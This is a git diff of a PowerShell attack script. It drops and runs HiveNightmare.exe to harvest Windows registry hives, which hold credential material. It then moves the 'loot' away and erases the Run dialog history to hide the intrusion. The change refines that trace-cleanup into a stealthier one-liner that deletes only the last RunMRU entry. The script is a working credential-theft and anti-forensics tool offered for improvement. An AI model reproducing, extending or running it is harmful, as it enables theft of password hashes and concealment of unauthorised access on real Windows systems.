@@ -16,18 +16,22 @@ $order66 = "$mytemp\hive\HiveNightmare.exe"
 #Create workdirr in mydocuments
 New-Item -ItemType Directory -Force -Path "$mytemp\hive"
 Start-Sleep 1
+
 #Copy that sweet thing to mydocuments
-copy-item -Path $source -Destination $destination -recurse -force
+Copy-Item -Path $source -Destination $destination -recurse -force
 Start-Sleep 1
+
 #Start the hivenightmare.exe and then remove it after 6 seconds
 #The start-sleep is requiered so the *.exe has time to run and collect the files
 Start-process -FilePath $order66 -WorkingDirectory $destination
-start-sleep 6
-#Extract loot with move-item to clear trace in my documents
+Start-Sleep 6
 Remove-Item $order66 -force -Confirm:$false
-move-item -Path $destination -Destination $loot[0] -force
-#Delete "run" history
-Remove-item -Path HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU -Force
+
+#Extract loot with move-item to clear trace in my documents
+Move-Item -Path $destination -Destination $loot[0] -force
+
+#Delete last entry in Run
+$p = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"; $m = "MRUList"; $l=(gp $p).$m; rp $p $l[0]; sp $p $m $l.Substring(1);
 
 
 #Feel free to improve and commit
